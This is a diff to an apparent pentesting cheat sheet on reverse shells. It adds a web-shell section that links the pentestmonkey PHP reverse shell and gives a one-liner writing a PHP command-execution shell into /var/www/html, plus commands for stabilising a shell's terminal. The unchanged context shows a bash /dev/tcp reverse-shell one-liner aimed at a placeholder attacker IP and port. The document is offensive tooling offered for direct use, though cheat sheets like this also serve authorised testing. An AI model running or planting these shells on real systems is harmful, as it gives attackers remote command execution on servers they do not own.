@@ -15,10 +15,15 @@ https://www.revshells.com/
 	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"
 	To use the bash's built-in /dev/tcp device file the use must use /bin/bash as shell. Often it uses sh or dash, then you can use bash -c "<cmd>" to force the bash
 
-## PHP
+## Web shells
+
+### PHP
 
 	https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 
+One liner:
+
+	echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 
 ## Fully interactive shell
 
@@ -31,6 +36,11 @@ then write
 
 	stty raw -echo; fg;
 	export TERM=xterm
+
+You can also forward config the shell:
+
+	export TERM=xterm-256color
+	stty rows 67 columns 318
 
 ## Powershell
 
